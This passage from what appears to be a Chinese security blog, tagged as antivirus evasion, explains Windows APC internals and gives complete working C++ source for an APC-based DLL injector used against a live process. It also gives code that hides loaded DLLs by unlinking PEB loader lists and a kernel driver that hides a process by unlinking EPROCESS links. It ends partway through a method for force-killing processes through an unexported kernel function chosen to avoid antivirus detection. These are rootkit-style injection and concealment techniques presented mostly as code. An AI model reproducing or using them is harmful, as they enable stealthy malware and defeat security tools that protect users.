<p>1.首先判断参数是否为1，当参数为1的时候处理用户APC。再判断Apcstate.UserApcPending是否为1，为1则有用户APC要执行。</p>
<p>2.将ApcState.UserApcPending设置为0.</p>
<p>3.链表操作，将当前APC从用户队列中移除。</p>
<p>4.调用函数(KAPC.KernelRoutine)释放KAPC结构内存空间</p>
<p>5.转到 KiInitializeUserApc 函数，将 CONTEXT 和 TrapFrame 传入 KeContextFromKframes</p>
<p>6.当windows把 CONTEXT 结构复制到堆栈之后，准备用户层执行环境，首先修改SS、DS、ES、FS、GS和EFLAGS寄存器</p>
<p>7.然后修改esp到3环堆栈</p>
<p>8.然后修改eip，这里永远返回一个固定的位置，但是这个位置在每次系统启动的时候都不相同，存放在3环的 ntdll 里的 KiUserApcDispatcher 参数里面</p>
<p>9.然后到ntdll里面定位到 KiUserApcDispatcher ，首先得到指向 CONTEXT 结构的指针，然后 pop eax 得 到 NormalRoutine 结构，这里当APC是内核APC的时候存储的是真正的APC地址，当APC是用户APC的时候存储的是指向用户APC的总入口。当我们调用 QueueUserAPC ，并没有指定 NormalRoutine 结构，只指定了 NormalContext 和 SystemArgument1 ，那么这个参数在 QueueUserAPC 内部指定，在 kernel32.dll 的 BaseDispatchAPC ，用来调用真正的用户APC函数。</p>
<p>10.调用ZwContinue 。</p>
<p>（1）返回内核，如果还有用户APC，重复上面的执行过程。 </p>
<p>（2）如果没有需要执行的用户APC，会将CONTEXT赋值给Trap_Frame结构体。就像从来没有修改过一样。 ZwContinue后面的代码不会执行，线程从哪里进0环仍然会从哪里回去。</p>
<p>11.使用 0x20 的调用号利用调用门回到0环。</p>
<h1 id="二、apc注入"><a href="#二、apc注入" class="headerlink" title="二、apc注入"></a>二、apc注入</h1><h2 id="2-1步骤"><a href="#2-1步骤" class="headerlink" title="2.1步骤"></a>2.1步骤</h2><p>1.当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断（或者是Messagebox弹窗的时候不点OK的时候也能注入）。</p>
<p>2.当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。</p>
<p>3.利用QueueUserAPC()这个API可以在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。</p>
<p>在整个执行过程中，线程并无任何异常举动，不容易被察觉，但缺点是对于单线程程序一般不存在挂起状态，所以APC注入对于这类程序没有明显效果。</p>
<h2 id="2-2流程"><a href="#2-2流程" class="headerlink" title="2.2流程"></a>2.2流程</h2><p>1.OpenProcess 打开进程</p>
<p>2.VirtualAlloc 申请空间</p>
<p>3.WriteProcessMemory 写入dll信息</p>
<p>4.根据进程对应的线程id打开线程</p>
<p>5.使用 QueueUserApc 插入执行</p>
<h2 id="2-3代码实现"><a href="#2-3代码实现" class="headerlink" title="2.3代码实现"></a>2.3代码实现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;TlHelp32.h&gt;</span><br><span class="line">#include&lt;tchar.h&gt;</span><br><span class="line"></span><br><span class="line">//提权函数</span><br><span class="line">BOOL EnableDebugPrivilege() &#123;</span><br><span class="line">	HANDLE hToken;</span><br><span class="line">	BOOL fok = FALSE;</span><br><span class="line">	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) &#123;</span><br><span class="line">		TOKEN_PRIVILEGES tp;</span><br><span class="line">		tp.PrivilegeCount = 1;</span><br><span class="line">		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid);</span><br><span class="line">		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">		AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL);</span><br><span class="line">		fok = (GetLastError() == ERROR_SUCCESS);</span><br><span class="line">		CloseHandle(hToken);</span><br><span class="line">	&#125;</span><br><span class="line">	return fok;</span><br><span class="line">&#125;</span><br><span class="line">BOOL APCInjectDLL(DWORD dwPid, char* pszDllName) &#123;</span><br><span class="line">	EnableDebugPrivilege(); </span><br><span class="line">	//打开进程,获取进程句柄</span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">	if (hProcess == NULL) &#123; return FALSE; &#125;</span><br><span class="line">	//向目标进程申请空间写入dll全路径 </span><br><span class="line">	int nSize = strlen(pszDllName);</span><br><span class="line">	LPVOID pDllAddr = VirtualAllocEx(hProcess, NULL, nSize, MEM_COMMIT, PAGE_READWRITE); </span><br><span class="line">	SIZE_T dwWrittenSize = 0; </span><br><span class="line">	WriteProcessMemory(hProcess, pDllAddr, pszDllName, nSize, &amp;dwWrittenSize); </span><br><span class="line">	//获取LoadLibraryA的地址</span><br><span class="line">	HMODULE hMod = GetModuleHandleA(&quot;kernel32.dll&quot;);</span><br><span class="line">	FARPROC pFuncAddr = GetProcAddress(hMod, &quot;LoadLibraryA&quot;); </span><br><span class="line">	//创建线程快照</span><br><span class="line">	THREADENTRY32 te = &#123; 0 &#125;; </span><br><span class="line">	te.dwSize = sizeof(te);</span><br><span class="line">	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);</span><br><span class="line">	if (hSnap == INVALID_HANDLE_VALUE) &#123; return FALSE; &#125;</span><br><span class="line">	DWORD dwRet = 0;</span><br><span class="line">	HANDLE hThread = NULL; </span><br><span class="line">	if (Thread32First(hSnap, &amp;te)) &#123; </span><br><span class="line">		do &#123;</span><br><span class="line">			if (te.th32OwnerProcessID == dwPid) &#123;</span><br><span class="line">				hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);</span><br><span class="line">				if (hThread) &#123;</span><br><span class="line">					dwRet = QueueUserAPC((PAPCFUNC)pFuncAddr, hThread, (ULONG_PTR)pDllAddr);</span><br><span class="line">					hThread = NULL;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; while (Thread32Next(hSnap, &amp;te));</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line">	CloseHandle(hProcess); </span><br><span class="line">	CloseHandle(hSnap); </span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;int main(int argc, char* argv[]) &#123; </span><br><span class="line">	if (argc == 3) &#123; </span><br><span class="line">		if (FALSE == APCInjectDLL((DWORD)_tstol(argv[1]), argv[2])) </span><br><span class="line">			printf(&quot;APCInject failed\n&quot;); else</span><br><span class="line">			printf(&quot;APCInject successfully\n&quot;); </span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		printf(&quot;\nUsage: %s &lt;PID&gt; &lt;Dllpath&gt;\n&quot;);</span><br><span class="line">		printf(&quot;Example: %s 520 C:\\test.dll\n&quot;); </span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将程序和要注入的dll放入虚拟机。在cmd中使用tasklist命令查看进程id。</p>
<p><img src="/images/APC%E6%B3%A8%E5%85%A5/image-20230912111408508.png" alt="image-20230912111408508"></p>
<p>找到一个OneDrive.exe,PID为5776</p>
<p>输入命令注入，结果如图：</p>
<p><img src="/images/APC%E6%B3%A8%E5%85%A5/image-20230912111646582.png" alt="image-20230912111646582"></p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>本篇简单介绍了apc注入的基本概念和流程，如果有哪里讲述不对的地还望各位大佬赐教。</p>
]]></content>
      <categories>
        <category>免杀基础</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>进程隐藏与强杀</title>
    <url>/2023/09/22/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E5%BC%BA%E6%9D%80/</url>
    <content><![CDATA[<p>​	进程是线程的容器。程序是指令、数据及其组织形式的描述，进程是程序的实体。一条线程指的是进程中一个单一顺序的控制流，一个进程中可以并发多个线程，每条线程并行执行不同的任务。在Unix System V及SunOS中也被称为轻量进程（lightweight processes），但轻量进程更多指内核线程（kernel thread），而把用户线程（user thread）称为线程。</p>
<span id="more"></span>

<h1 id="一、3环断链隐藏"><a href="#一、3环断链隐藏" class="headerlink" title="一、3环断链隐藏"></a>一、3环断链隐藏</h1><h2 id="1-1基本原理"><a href="#1-1基本原理" class="headerlink" title="1.1基本原理"></a>1.1基本原理</h2><p>​		每个线程都有一个TEB结构来存储线程的一些属性结构，TEB的地址用fs:[0]来获取。而在0x30这个地址有一个指针指向PEB结构，PEB就是进程用来记录自己信息的一个结构。在PEB的0x00c偏移有一个_PEB_LDR_DATA结构。结构中提供如下3个双向链表。</p>
<p>InLoadOrderModuleList ：模块加载的顺序、</p>
<p>InMemoryOrderModuleList ：模块在内存的顺序</p>
<p>InInitializationOrderModuleList ：模块初始化的顺序</p>
<p>注意：</p>
<p>(1)x86下，fs:[0x0]寄存器在ring3指向TEB结构，TEB+0x30处指向PEB结构，PEB+0x0c处指向PEB_LDR_DATA结构，PEB_LDR_DATA+0x1c处为InInitializationOrderModuleList。</p>
<p>(2)x64下，gs:[0x30]寄存器在ring3指向TEB结构，TEB+0x60处指向PEB结构，PEB+0x18处指向PEB_LDR_DATA结构，PEB_LDR_DATA+0x30处为 InInitializationOrderModuleList。</p>
<p>​		当我们从 _PEB_LDR_DATA 结构中取到 InInitializationorderModuleList 结构时，这个结构中的Flink 指向真正的模块链表，这个真正的链表的每个成员都是一个 LDR_DATA_TABLE_ENTRY 结构。之前的 _PEB_LDR_DATA 只是一个入口，这个结构只有一个，它不是链表节点。_LDR_DATA_TABLE_ENTRY结构中的 _LIST_ENTRY 结构对应下一个 _LDR_DATA_TABLE_ENTRY节点中的 _LIST_ENTRY 结构。如：第一个 _LDR_DATA_TABLE_ENTRY 结构中的 InInitializationOrderModuleList 中的 Flink 指向的是第二个 _LDR_DATA_TABLE_ENTRY 结构中 InInitializationOrderModuleList 的首地址，而不是另外两个 _LIST_ENTRY 结构。第一个__LDR_DATA_TABLE_ENTRY 结构中的 Blink 指向 PEB_LDR_DATA 中对应成员的 Blink 。最后一个 _LDR_DATA_TABLE_ENTRY 结构中的 Flink 指向 PEB_LDR_DATA 中对应的成员的 Flink。 PEB_LDR_DATA 结构中的 Blink 指向最后一个 _LDR_DATA_TABLE_ENTRY 中对应成员的 Blink 。PEB_LDR_DATA 结构中的 Flink 指向第一个_LDR_DATA_TABLE_ENTRY 中对应的成员的 Flink。</p>
<h2 id="1-2代码实现"><a href="#1-2代码实现" class="headerlink" title="1.2代码实现"></a>1.2代码实现</h2><p>​		API是通过找_PEB_LDR_DATA这个结构来获取程序有哪些模块，所以通过修改这几个双向链表就可以实现隐藏某个dll。_DRIVER_OBJECT 结构体中 0x014的偏移有一个成员， DriverSection 可以实现对内核模块的遍历。 DriverSection 是一个指针，实际上是对应着一个结构体： _LDR_DATA_TABLE_ENTRY。在 _LDR_DATA_TABLE_ENTRY 的0x018偏移处有一个 DllBase ，这里存放的就是dll的地址。因此，我们如果要想隐藏某个指定的dll，就可以通过 DllBase 的方式，通过 GetModuleHandleA 获取dll的句柄，来进行比对。</p>
<h3 id="1-2-1代码实现步骤"><a href="#1-2-1代码实现步骤" class="headerlink" title="1.2.1代码实现步骤"></a>1.2.1代码实现步骤</h3><p>具体代码实现步骤可以分为如下几步：</p>
<p>（1）首先定义 _PEB_LDR_DATA 和 _LDR_DATA_TABLE_ENTRY 结构。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// LDR链表头 </span><br><span class="line">typedef struct _PEB_LDR_DATA &#123;</span><br><span class="line">	DWORD Length; </span><br><span class="line">	bool Initialized; PVOID SsHandle;</span><br><span class="line">	LIST_ENTRY InLoadOrderModuleList; // 指向了 InLoadOrderModuleList 链表的第一项 </span><br><span class="line">	LIST_ENTRY InMemoryOrderModuleList; </span><br><span class="line">	LIST_ENTRY InInitializationOrderModuleList; </span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA;</span><br><span class="line">typedef struct _LDR_DATA_TABLE_ENTRY &#123;</span><br><span class="line">	LIST_ENTRY InLoadOrderModuleList; </span><br><span class="line">	LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">	LIST_ENTRY InInitializationOrderModuleList; </span><br><span class="line">	void* BaseAddress; </span><br><span class="line">	void* EntryPoint;</span><br><span class="line">	ULONG SizeOfImage;</span><br><span class="line">	UNICODE_STRING FullDllName;</span><br><span class="line">	UNICODE_STRING BaseDllName; </span><br><span class="line">	ULONG Flags;</span><br><span class="line">	SHORT LoadCount; </span><br><span class="line">	SHORT TlsIndex;</span><br><span class="line">	HANDLE SectionHandle;</span><br><span class="line">	ULONG CheckSum;</span><br><span class="line">	ULONG TimeDateStamp; </span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure>

<p>（2）然后通过汇编定位到LDR。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__asm &#123;</span><br><span class="line">mov eax,fs:[0x30] // PEB</span><br><span class="line">mov ecx,[eax + 0x0c] // LDR</span><br><span class="line">mov ldr,ecx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（3）通过获取到的ldr结构指向 InLoadOrderModuleList。（以InLoadOrderModuleList为例）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Head = &amp;(ldr-&gt;InLoadOrderModuleList);</span><br></pre></td></tr></table></figure>

<p>（4）然后通过 CONTAINING_RECORD 这个宏返回结构体基址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cur = Head-&gt;Flink;</span><br><span class="line">ldte = CONTAINING_RECORD( Cur, LDR_DATA_TABLE_ENTRY, </span><br><span class="line">InInitializationOrderModuleList);</span><br></pre></td></tr></table></figure>

<p>（5）进行断链操作。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldte-&gt;InInitializationOrderModuleList.Blink-&gt;Flink = ldte- &gt;InInitializationOrderModuleList.Flink;</span><br><span class="line">ldte-&gt;InInitializationOrderModuleList.Flink-&gt;Blink = ldte- &gt;InInitializationOrderModuleList.Blink;</span><br></pre></td></tr></table></figure>

<p>（6）后将指针指向下一个结构.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cur = Cur-&gt;Flink;</span><br></pre></td></tr></table></figure>

<p>（7）如果想隐藏全部</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void HideModule_All()&#123;</span><br><span class="line">	PPEB_LDR_DATA ldr; </span><br><span class="line">	PLDR_DATA_TABLE_ENTRY ldte; // 获取LDR</span><br><span class="line">	__asm &#123; </span><br><span class="line">		mov eax,fs:[0x30] </span><br><span class="line">		mov ecx,[eax + 0x0c] </span><br><span class="line">		mov ldr,ecx </span><br><span class="line">	&#125;</span><br><span class="line">	PLIST_ENTRY Head; </span><br><span class="line">	Head = &amp;(ldr-&gt;InLoadOrderModuleList);</span><br><span class="line">	Head-&gt;Flink = Head-&gt;Blink = Head; </span><br><span class="line">	Head = &amp;(ldr-&gt;InMemoryOrderModuleList); </span><br><span class="line">	Head-&gt;Flink = Head-&gt;Blink = Head;</span><br><span class="line">	Head = &amp;(ldr-&gt;InInitializationOrderModuleList); </span><br><span class="line">	Head-&gt;Flink = Head-&gt;Blink = Head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-2全部代码实现"><a href="#1-2-2全部代码实现" class="headerlink" title="1.2.2全部代码实现"></a>1.2.2全部代码实现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include &lt;Windows.h&gt; </span><br><span class="line">typedef struct _UNICODE_STRING &#123; </span><br><span class="line">	USHORT Length; </span><br><span class="line">	USHORT MaximumLength;</span><br><span class="line">	PWSTR Buffer;</span><br><span class="line">&#125; UNICODE_STRING, *PUNICODE_STRING; </span><br><span class="line">typedef struct _PEB_LDR_DATA &#123; </span><br><span class="line">	DWORD Length;</span><br><span class="line">	bool Initialized;</span><br><span class="line">	PVOID SsHandle;</span><br><span class="line">	LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">	LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">	LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; </span><br><span class="line">typedef struct _LDR_DATA_TABLE_ENTRY &#123; </span><br><span class="line">	LIST_ENTRY InLoadOrderModuleList; </span><br><span class="line">	LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">	LIST_ENTRY InInitializationOrderModuleList; </span><br><span class="line">	void* BaseAddress; </span><br><span class="line">	void* EntryPoint;</span><br><span class="line">	ULONG SizeOfImage; </span><br><span class="line">	UNICODE_STRING FullDllName;</span><br><span class="line">	UNICODE_STRING BaseDllName;</span><br><span class="line">	ULONG Flags; </span><br><span class="line">	SHORT LoadCount;</span><br><span class="line">	SHORT TlsIndex;</span><br><span class="line">	HANDLE SectionHandle;</span><br><span class="line">	ULONG CheckSum; </span><br><span class="line">	ULONG TimeDateStamp;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY; </span><br><span class="line">void HideModule(HMODULE hModule) &#123;</span><br><span class="line">	PPEB_LDR_DATA ldr; </span><br><span class="line">	PLDR_DATA_TABLE_ENTRY ldte;</span><br><span class="line">	__asm &#123; </span><br><span class="line">		mov eax, fs: [0x30] </span><br><span class="line">		mov ecx, [eax + 0x0c]</span><br><span class="line">		mov ldr, ecx </span><br><span class="line">	&#125;</span><br><span class="line">	PLIST_ENTRY Head, Cur;</span><br><span class="line">	Head = &amp;(ldr-&gt;InLoadOrderModuleList);</span><br><span class="line">	Cur = Head-&gt;Flink;</span><br><span class="line">	do &#123; </span><br><span class="line">		ldte = CONTAINING_RECORD(Cur, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);</span><br><span class="line">		if (ldte-&gt;BaseAddress == hModule) &#123; </span><br><span class="line">			ldte-&gt;InLoadOrderModuleList.Blink-&gt;Flink = ldte -&gt; InLoadOrderModuleList.Flink;</span><br><span class="line">			ldte-&gt;InLoadOrderModuleList.Flink-&gt;Blink = ldte -&gt; InLoadOrderModuleList.Blink; </span><br><span class="line">		&#125;Cur = Cur-&gt;Flink;</span><br><span class="line">	&#125; while (Head != Cur); </span><br><span class="line">	Head = &amp;(ldr-&gt;InMemoryOrderModuleList);</span><br><span class="line">	Cur = Head-&gt;Flink; </span><br><span class="line">	do &#123; </span><br><span class="line">		ldte = CONTAINING_RECORD(Cur, LDR_DATA_TABLE_ENTRY, InMemoryOrderModuleList);</span><br><span class="line">		if (ldte-&gt;BaseAddress == hModule) &#123;</span><br><span class="line">			ldte-&gt;InMemoryOrderModuleList.Blink-&gt;Flink = ldte -&gt; InMemoryOrderModuleList.Flink; </span><br><span class="line">			ldte-&gt;InMemoryOrderModuleList.Flink-&gt;Blink = ldte -&gt; InMemoryOrderModuleList.Blink; </span><br><span class="line">		&#125;Cur = Cur-&gt;Flink;</span><br><span class="line">	&#125; while (Head != Cur);</span><br><span class="line">	Head = &amp;(ldr-&gt;InInitializationOrderModuleList);</span><br><span class="line">	Cur = Head-&gt;Flink;</span><br><span class="line">	do &#123; </span><br><span class="line">		ldte = CONTAINING_RECORD(Cur, LDR_DATA_TABLE_ENTRY, InInitializationOrderModuleList);</span><br><span class="line">		if (ldte-&gt;BaseAddress == hModule) &#123; </span><br><span class="line">			ldte-&gt;InInitializationOrderModuleList.Blink-&gt;Flink = ldte -&gt; InInitializationOrderModuleList.Flink; </span><br><span class="line">			ldte-&gt;InInitializationOrderModuleList.Flink-&gt;Blink = ldte -&gt; InInitializationOrderModuleList.Blink;</span><br><span class="line">		&#125;</span><br><span class="line">		Cur = Cur-&gt;Flink;</span><br><span class="line">	&#125; while (Head != Cur);</span><br><span class="line">&#125;int main(int argc, CHAR* argv[]) &#123; </span><br><span class="line">	printf(&quot;please enter any key to continue&quot;);</span><br><span class="line">	getchar(); </span><br><span class="line">	HideModule(GetModuleHandleA(&quot;kernel32.dll&quot;));</span><br><span class="line">	printf(&quot;success\n&quot;); </span><br><span class="line">	getchar();</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-3实现效果"><a href="#1-2-3实现效果" class="headerlink" title="1.2.3实现效果"></a>1.2.3实现效果</h3><p>执行前</p>
<p><img src="/images/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E5%BC%BA%E6%9D%80/image-20230926161248337.png" alt="image-20230926161248337"></p>
<p>执行后</p>
<p><img src="/images/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E5%BC%BA%E6%9D%80/image-20230926161331471.png" alt="image-20230926161331471"></p>
<h1 id="二、0环断链隐藏"><a href="#二、0环断链隐藏" class="headerlink" title="二、0环断链隐藏"></a>二、0环断链隐藏</h1><h2 id="2-1-0环断链隐藏与3环断链隐藏的区别"><a href="#2-1-0环断链隐藏与3环断链隐藏的区别" class="headerlink" title="2.1 0环断链隐藏与3环断链隐藏的区别"></a>2.1 0环断链隐藏与3环断链隐藏的区别</h2><p>LoadPE是基于3环检查的软件，所以上述代码可以让LoadPE无法检测出dll的加载，但对于一些基于0环检查的软件，如：Process Hacker则无法避免检测出dll的加载。如下图所示</p>
<p><img src="/images/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E5%BC%BA%E6%9D%80/image-20230926162104549.png" alt="image-20230926162104549"></p>
<p>所以下文将继续介绍0环的断链隐藏。下文主要用于隐藏进程而非dll的加载。</p>
<h2 id="2-2基本原理"><a href="#2-2基本原理" class="headerlink" title="2.2基本原理"></a>2.2基本原理</h2><p>在操作系统层面上，进程本质上就是一个结构体，当操作系统想要创建一个进程时，就分配一块内存，填入一个结构体，并为结构体中的每一项填充一些具体值，而这个结构体，就是 EPROCESS 。在 +0x088 偏移处有一个指针 ActiveProcessLinks ，指向的是 _LIST_ENTRY ，它是双向链表，所有的活动进程都连接在一起，构成了一个链表。那么链表总有一个头，全局变量 PsActiveProcessHead （八个字节）指向全局链表头。这个链表跟进程隐藏有关，只要我们把想要隐藏进程对应的 EPROCESS 的链断掉，就可以达到在0环进程隐藏的目的。前四个字节指向的是下一个 EPROCESS 结构，但指向的并不是 EPROCESS 的首地址，而是每一个进程的_EPROCESS + 0x88 的位置。所以当我们要查询下一个进程结构时，需要 -0x88。比如当前 PsActiveProcessHead 指向的下一个地址为 0x863b58b8 ，用windbg查询为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _EPROCESS 863b58b8-0x88</span><br></pre></td></tr></table></figure>

<p>在0x174偏移的地方存储着进程名，我们可以看到第一个 EPROCESS 结构对应的是 System 进程，这里0x88 偏移存放的就是下一个 EPROCESS 结构的地址，但是这里注意，因为这个结构的地址是指向下一个链表的地址，所以如果要得到 EPROCESS 的首结构就需要 -0x88。那么到这里我们的思路就清晰了，通过EPROCESS 找到我们要隐藏的进程的 ActiveProcessLinks ，将双向链表的值修改，就可以将我们想要隐藏的这个进程的 ActiveProcessLinks 从双向链表中抹去的效果，这里的话如果在windbg里面直接使用 ed 修改的话是比较方便的，但是如果要使用代码来进行修改的话就需要首先定位到 EPROCESS 在 ETHREAD 的 0x220 偏移得到 ThreadsProcess ，指向的是 _EPROCESS 这个结构体。那么就可以用汇编实现找到 EPROCESS 结构。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__asm &#123; </span><br><span class="line">	mov eax, fs: [0x124] ;</span><br><span class="line">	mov eax, [eax + 0x220];</span><br><span class="line">	mov pEprocess, eax;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先定义一个指针指向 EPROCESS 结构，并初始化指向 ActiveProcessLinks 的指针</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pCurProcess = pEprocess; </span><br><span class="line">curNode = (PLIST_ENTRY)((ULONG)pCurProcess + 0x88);</span><br></pre></td></tr></table></figure>

<p>然后判断通过 EPROCESS 的0x174处的 ImageFileName 来判断进程名是不是我们想要隐藏的进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ImageFileName = (PCHAR)pCurProcess + 0x174; </span><br><span class="line">if (strcmp(ImageFileName, &quot;notepad.exe&quot;) == 0)</span><br></pre></td></tr></table></figure>

<p>如果不是我们想要的进程就继续往下取 ActiveProcessLinks 的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pCurProcess = (PEPROCESS)(*(PULONG)((ULONG)pCurProcess + 0x88) - 0x88);</span><br></pre></td></tr></table></figure>

<h2 id="2-2完整代码实现"><a href="#2-2完整代码实现" class="headerlink" title="2.2完整代码实现"></a>2.2完整代码实现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;ntddk.h&gt;</span><br><span class="line">NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path);</span><br><span class="line">VOID DriverUnload(PDRIVER_OBJECT drtver);</span><br><span class="line">NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path) &#123;</span><br><span class="line">	PEPROCESS pEprocess, pCurProcess;</span><br><span class="line">	PCHAR ImageFileName;</span><br><span class="line">	__asm &#123;</span><br><span class="line">		mov eax, fs: [0x124] ;</span><br><span class="line">		mov eax, [eax + 0x220];</span><br><span class="line">		mov pEprocess, eax;</span><br><span class="line">	&#125;</span><br><span class="line">	pCurProcess = pEprocess;</span><br><span class="line">	do &#123;</span><br><span class="line">		ImageFileName = (PCHAR)pCurProcess + 0x174;</span><br><span class="line">		if (strcmp(ImageFileName, &quot;notepad.exe&quot;) == 0) &#123;</span><br><span class="line">			PLIST_ENTRY preNode, curNode, nextNode;</span><br><span class="line">			curNode = (PLIST_ENTRY)((ULONG)pCurProcess + 0x88);</span><br><span class="line">			nextNode = curNode-&gt;Flink;</span><br><span class="line">			preNode = curNode-&gt;Blink;</span><br><span class="line">			preNode-&gt;Flink = curNode-&gt;Flink;</span><br><span class="line">			nextNode-&gt;Blink = curNode-&gt;Blink;</span><br><span class="line">			DbgPrint(&quot;断链成功\n&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		pCurProcess = (PEPROCESS)(*(PULONG)((ULONG)pCurProcess + 0x88) - 0x88);</span><br><span class="line">	&#125; while (pEprocess != pCurProcess);</span><br><span class="line">	driver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	return STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">VOID DriverUnload(PDRIVER_OBJECT driver) &#123;</span><br><span class="line">	DbgPrint(&quot;驱动卸载成功\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码执行后</p>
<p><img src="/images/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E5%BC%BA%E6%9D%80/image-20230926201455875.png" alt="image-20230926201455875"></p>
<h1 id="三、进程强杀"><a href="#三、进程强杀" class="headerlink" title="三、进程强杀"></a>三、进程强杀</h1><p>ZwTerminalProcess是一个ring0函数，用于终止一个进程及其所有线程，但是该函数往往被杀软检测到，所以我们应该使用更为底层的PspTerminalProcess函数。</p>
<h2 id="3-1PspTerminalProcess函数"><a href="#3-1PspTerminalProcess函数" class="headerlink" title="3.1PspTerminalProcess函数"></a>3.1PspTerminalProcess函数</h2><p>PspTerminalProcess函数是一个未导出函数，WDK说明文档中只包含了内核模块导出的函数，对于未导出的函数，则不能直接使用。对于未导出函数的使用通常采用两种方式。</p>
<ol>
<li><strong>暴力搜索，提取该函数的特征码，全盘搜索。</strong></li>
<li><strong>如果有已文档化的函数调用了PspTerminateProcess，那我们就可以通过指针加偏移的方式获取到他的地址，同样可以调用。</strong></li>
</ol>
<h2 id="3-2如何全盘搜索"><a href="#3-2如何全盘搜索" class="headerlink" title="3.2如何全盘搜索"></a>3.2如何全盘搜索</h2><h3 id="3-2-1搜索模块"><a href="#3-2-1搜索模块" class="headerlink" title="3.2.1搜索模块"></a>3.2.1搜索模块</h3><p>那么我们要想全盘搜索，肯定要先找到内核模块，每个内核模块都有一个对应的结构体，来描述这个模块在内核中的：位置、大小、名称等等， DriverEntry 的第一个参数就是这个结构体。主要关注 DriverSize 和 DriverName 这两个参数， DriverSize 主要是表示驱动的大小，DriverName 为驱动的名称。</p>
<p>通过 _DRIVER_OBJECT 结构体中 0x014的偏移有一个成员， DriverSection 则可以实现对内核模块的遍历。 DriverSection 是一个指针，实际上是对应着一个结构体： _LDR_DATA_TABLE_ENTRY。通过结构中的 InLoadOrderLinks 可以查询到其他内核模块的信息。依此类推，可以获取到其他所有的内核模块。</p>
<h3 id="3-2-2找特征码"><a href="#3-2-2找特征码" class="headerlink" title="3.2.2找特征码"></a>3.2.2找特征码</h3><p>说完了怎样搜寻模块，再来看看怎么找特征码，首先定位到函数。这种 mov 、 push 指令因为可能每个模块都会有，所以不能当作特征码，也不能够选重定位的数据当作特征码。通过windbg的跟入，我们会收集到如下代码。</p>
